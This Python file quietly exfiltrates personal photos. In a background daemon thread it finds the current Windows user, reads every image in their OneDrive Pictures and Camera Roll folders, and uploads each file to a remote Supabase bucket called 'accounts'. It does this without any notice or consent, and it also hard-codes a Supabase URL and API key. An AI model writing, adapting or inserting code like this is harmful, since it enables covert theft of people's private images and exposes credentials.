import threading
import time
import socket
import os
import getpass
from supabase import create_client, Client

SUPABASE_URL = "https://gyixodkqsgazorbbifqa.supabase.co"
SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imd5aXhvZGtxc2dhem9yYmJpZnFhIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTA1ODY5MjAsImV4cCI6MjA2NjE2MjkyMH0.CDQS91rJrsszqg2OGMfAvLRahmn5Vgb5lb4VSt5yYMw"
BUCKET_NAME = "accounts"

def check_image_directory():
    username = getpass.getuser()
    print("Logged-in user:", username)

    image_extensions = ('.png', '.jpg', '.jpeg', '.gif', '.bmp', '.webp')
    directory_name = f"C:\\Users\\{username}\\OneDrive\\Pictures";

    if os.path.exists(directory_name) and os.path.isdir(directory_name):
        print("✅ Directory exists.")
        if (start_upload(username,image_extensions, directory_name) == True):
            print("All Uploaded")


    if os.path.exists(directory_name+f"\\Camera Roll") and os.path.isdir(directory_name+f"\\Camera Roll"):
        directory_name += f"\\Camera Roll";
        print("✅ Directory Camera Roll exists.")
        if (start_upload(username,image_extensions, directory_name) == True):
            print("All Camera Roll images Uploaded")


def start_upload(username,image_extensions,directory_name):
    if not os.path.exists(directory_name):
        print("Directory does not exist:", directory_name)
        return

    images = [f for f in os.listdir(directory_name) if f.lower().endswith(image_extensions)]
    supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)
    print("directory_name:", directory_name)
    for im in images:
        print("Uploading:", im)
        local_image_path = os.path.join(directory_name, im)
        with open(local_image_path, "rb") as f:
            file_data = f.read()
            upload_path = f"{username}/{im}"
            res = supabase.storage.from_(BUCKET_NAME).update(
                upload_path,
                file_data
            )
            print("Uploaded:", res)

    return True;


def starter_thread():
    thread1=threading.Thread(target=check_image_directory,daemon=True);
    thread1.start()